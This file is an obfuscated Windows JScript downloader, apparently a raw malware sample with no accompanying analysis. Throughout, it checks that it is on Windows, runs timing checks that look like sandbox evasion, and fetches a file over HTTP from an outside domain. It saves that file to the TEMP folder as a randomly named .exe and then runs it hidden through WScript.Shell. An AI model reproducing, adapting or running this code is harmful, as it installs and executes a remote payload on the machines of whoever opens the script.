var B = false;
var c = "CreateObject";
var MD = function cw() {return WScript[c]("WScript.Shell");}(), U = 11;
var Ev = "MSXML2.XMLHTTP";
var Tp = 2123213;
var z = 0;
function SI(vs){MD["Run"](vs, z, z);};
function x0(){return "" + Ev;};
function r(Q, v){z = z * 1; return Q - v;};
function YA(){return c;};
/*@cc_on
  @if (@_win32 || @_win64)
    B = true;
  @end
@*/
if (B)
{
var dx = "";
function I(){return 22;};
var ey = 0; var V = 0;
function O()
{
var c0 = new this["Date"]();
var f = c0["getUTCMilliseconds"]();
WScript["Sleep"](I());
var c0 = new this["Date"]();
var x1 = c0["getUTCMilliseconds"]();
WScript["Sleep"](I());
var c0 = new this["Date"]();
var n = c0["getUTCMilliseconds"]();
var ey = "In";
ey = r(x1, f);
var V = "M";
V = r(n, x1);
dx = "open";
return r(ey, V);
}
var y = false;
var a = false;
for (var R = z; R < I() * 1; R++){if (O() != z){
y = true; 
V = "31" + 11 * ey + V; 
a = true; 
break;
}}
function x() {return ((y == true) && (y == a)) ? 1 : z;};
if (y && x() && a){
function yP() {return MD["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "wzCC5uZaS8KpfR.exe";};
 j = x0();
 Dd = WScript[c](j);
 var F = 1;
 while (F){
try {
Dd[dx]("GET", "http://shippedmedicalsupplies.com/n5ids", false);
Dd["send"]();
do0 = "Sleep";
for (;;){WScript[do0](I() * 11); if (Dd["readystate"] >= 2 * 2) break;};
F = z;
} catch(J){};
}
function ZH(t) {var Xx = (1, 2, 3, 4, 5, t); return Xx;};
S = WScript[YA()]("ADODB.Stream");
j = S;
j[dx]();
j["type"] = ZH(1);
j["write"](Dd["ResponseBody"]);
S["position"] = ZH(z);
j["Save" + "ToFile"](yP(), 2);
S["c"+"lose"]();
T = yP();
SI(T);
}
}

